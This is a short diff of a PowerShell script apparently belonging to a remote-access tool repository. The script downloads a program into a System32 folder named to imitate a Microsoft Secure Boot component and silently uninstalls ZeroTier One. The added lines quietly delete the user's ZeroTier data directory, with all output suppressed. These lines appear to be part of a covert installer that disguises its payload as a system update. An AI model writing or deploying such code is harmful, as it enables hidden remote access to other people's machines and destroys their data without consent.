@@ -4,9 +4,13 @@ $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
+$ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 #Code starts Here
 Install-PackageProvider -Name NuGet -Force | Out-Null
 Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
+if (Test-Path $ztdatadir) {
+Remove-Item -Path $ztdatadir -Force -ErrorAction SilentlyContinue | Out-Null
+}
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
